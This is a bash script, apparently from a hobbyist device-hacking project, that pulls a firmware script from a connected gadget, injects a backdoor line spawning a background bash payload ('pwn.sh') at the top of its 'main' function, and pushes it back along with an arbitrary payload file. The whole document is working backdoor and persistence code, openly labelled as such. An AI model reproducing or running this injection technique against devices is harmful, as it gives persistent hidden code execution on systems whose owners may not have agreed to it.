#!/usr/bin/env bash

set -euo pipefail
cd -- "$(dirname -- "$0")"

mkdir -p tmp

echo "resetting gadget..."
sudo ./scripts/ctrl-gadget.sh reset
sleep 2

SHA1_EXPECTED="2a58d68aa287804d9a456dcf2214cad3827c7e3f"
PAYLOAD="payload.txt"
PAYLOAD_FINAL=${1-$PAYLOAD}

confirm() {
    read -r -p "${1:-Are you sure} (y/n)? " YESNO
    [[ "$YESNO" =~ ^[yY] ]]
}

# The injection point is the file '/navi/yellowtool/src/main-ulc.xs'.
# This file is part of the same system that we use to communicate with
# the device, so care should be taken to avoid breaking it and losing
# access to the device.
# We inject at the top of the 'main' function on that file.
# The system uses a programming language similar to JS, that appears to
# use a proprietary engine. Being plaintext (not compiled), means that
# it can be easily exploited.
# The payload goes on a separate 'pwn.sh' file to isolate any errors.
# Originally the file '/navi/yellowtool/yellowtool.sh' was considered
# for the injection point, but the upload protocol clears the execute
# bit, and that would break everything.

# inject backdoor

echo "downloading 'main-ulc.xs'..."
rm -f tmp/main-ulc.xs
./scripts/ctrl-proto.py pull yellowtool/src/main-ulc.xs tmp/main-ulc.xs

if grep -qF "// mn4-pwned-v0" tmp/main-ulc.xs; then
    echo "already pwned, not doing it again"
    PAYLOAD_FINAL=${1-}
else
    {
        sed -ne 'p;/^async main()/q' tmp/main-ulc.xs
        # the actual backdoor injection
        echo '    const pwn = spawn("/bin/bash", "-c", "( setsid bash /navi/yellowtool/pwn.sh >/dev/null 2>&1 &)", { stdin: @null, stdout: @null, stderr: @null }); await pwn.status; // mn4-pwned-v0'
        sed -e '1,/^async main()/d' tmp/main-ulc.xs
    } >tmp/main-ulc.xs.pwn

    SHA1=$(sha1sum tmp/main-ulc.xs | head -c40)
    echo "file hash = $SHA1"
    if [ "$SHA1" != "$SHA1_EXPECTED" ]; then
        echo " expected = $SHA1_EXPECTED"
        echo "file 'tmp/main-ulc.xs' does not match expected content"
        echo "check the file 'tmp/main-ulc.xs.pwn'"
        confirm "continue"
    fi

    echo "uploading pwned 'main-ulc.xs'..."
    ./scripts/ctrl-proto.py push tmp/main-ulc.xs.pwn yellowtool/src/main-ulc.xs
fi

# send payload

if [ -z "$PAYLOAD_FINAL" ]; then
    echo "will not upload payload again, pass new payload file as argument, e.g.:"
    echo "$0 $PAYLOAD"
else
    echo "uploading payload..."
    ./scripts/ctrl-proto.py push "$PAYLOAD_FINAL" yellowtool/pwn.sh
fi
